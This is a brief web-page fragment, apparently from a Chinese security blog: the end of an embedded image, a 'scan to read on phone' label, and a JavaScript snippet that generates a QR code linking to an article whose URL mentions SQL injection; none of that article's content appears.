fHNzPV4/qd4PQPuWOFWetQtcLKx3iuaU77IPQvBbCzLkOQoP+TlbNGNB9cJtnL4Tm/kLryh1tIBY3XnsCeyDXnv+0+78AAAD//0mC3GcAAAAGSURBVAMAG8uUfZcZgM4AAAAASUVORK5CYII=)

手机扫码阅读

网络安全


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/a8erp-Ajax\_XT-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 